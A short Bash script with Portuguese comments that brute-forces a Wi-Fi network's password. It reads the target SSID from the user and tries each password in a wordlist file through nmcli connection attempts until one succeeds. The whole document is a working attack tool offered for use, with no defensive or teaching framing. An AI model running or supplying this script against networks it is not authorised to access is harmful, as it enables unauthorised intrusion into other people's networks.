#!/bin/bash

# Solicita o nome do SSID ao usuário
read -p "Digite o nome do SSID: " SSID

# Arquivo com a lista de senhas
PASSWORD_LIST="senhas.txt"

# Função para testar a senha
test_password() {
    local PASSWORD=$1
    nmcli dev wifi connect "$SSID" password "$PASSWORD" &> /dev/null
    if [ $? -eq 0 ]; then
        echo "Senha encontrada: $PASSWORD"
        exit 0
    else
        echo "Senha incorreta: $PASSWORD"
    fi
}

# Ler o arquivo de senhas e testar cada uma
while IFS= read -r PASSWORD; do
    test_password "$PASSWORD"
done < "$PASSWORD_LIST"

echo "Nenhuma senha funcionou."
